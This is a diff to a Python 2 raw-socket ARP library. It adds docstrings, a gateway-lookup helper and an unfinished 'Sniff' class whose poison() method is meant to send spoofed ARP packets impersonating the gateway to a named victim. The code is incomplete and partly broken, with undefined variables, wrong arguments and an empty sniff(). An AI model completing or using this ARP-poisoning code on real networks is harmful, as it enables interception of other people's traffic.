@@ -1,6 +1,8 @@
 from struct import pack,unpack
 from socket import *
 from collections import OrderedDict
+from subprocess import Popen, PIPE
+from os import popen
 
 import threading
 
@@ -15,28 +17,44 @@ u8 = lambda x : unpack("!B", x)[0]
 u16 = lambda x : unpack("!H", x)[0]
 
 def mac2str(mac):
+    ''' mac address to byte code '''
     return b"".join(chr(int(x, 16)) for x in str(mac).split(':'))
 
 def str2mac(s):
+    ''' byte code to mac address '''
     if isinstance(s, str):
         return ("%02x:"*6)[:-1] % tuple(map(ord, s))
     return ("%02x:"*6)[:-1] % tuple(s)
 
 def getMyMac(iface):
+    ''' Get my Mac address using RAW socket '''
     s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
     s.bind(( iface, ETHERTYPE_IP ))
     return str2mac( s.getsockname()[4] )
 
 def getMyIP():
+    ''' Get my ip using AF_INET socket '''
     s = socket( AF_INET, SOCK_DGRAM )
     s.connect(( "8.8.8.8", 1 ))
     return s.getsockname()[0]
 
 def getMacByIP(iface, ip):
+    ''' Get mac address by ip using arp broadcast '''
     response = ARP(iface).sendrecvarp( "REQUEST", target_mac="ff:ff:ff:ff:ff:ff", target_ip=ip)
     print response['arp']['psrc'], ip
     if response['arp']['psrc'] == ip:
         return response['arp']['hwsrc']
+
+
+def getGWIP():
+    ''' Get default gateway IP for a local interface '''
+    return popen("route|grep default|awk '{print $2}'").read()
+
+
+    
+    # return system_call("route -n get default | grep 'gateway' | awk '{print $2}'")
+
+print getGWIP()
 
 class ARP:
     def __init__(self, iface):
@@ -49,6 +67,7 @@ class ARP:
         
         
     def sendarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None):
+        ''' send raw arp packet '''
         packet_frame = OrderedDict()
         #### ETHERNET HEADER ###
         packet_frame['dst']    = mac2str( self.target_mac if dst is None else dst )
@@ -81,6 +100,7 @@ class ARP:
 
 
     def sendrecvarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None, retry=0):
+        ''' send arp packet and recv arp packet '''
         s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_ARP ) )
         s.bind(( self.iface, ETHERTYPE_ARP )) # FOR RECV ARP PACKET
 
@@ -103,6 +123,7 @@ class ARP:
 
     @staticmethod
     def parseArpHeader(packet):
+        ''' parse packet and pick arp header '''
         ether = {
             'dst' : str2mac( packet[0:6]) ,
             'src' : str2mac( packet[6:12] ),
@@ -120,6 +141,27 @@ class ARP:
         return None
     
 
+class Sniff(ARP):
+    '''
+    sender_mac : my_mac
+    sender_ip : gateway_ip
+    target_mac : victim_mac
+    target_ip : victim_ip
+    '''
+    def __init__(self, arp, ip):
+        self.ip = ip
+
+    def poison(self):
+        arp.sendarp(
+            sender_mac = getMyMac( arp.iface ),
+            sender_ip  = getGWIP(),
+            target_mac = getMacByIP( ip ),
+            target_ip  = ip
+            )
+        pass
+    
+    def sniff(self):
+        pass
 
 
 a = ARP("ens33")
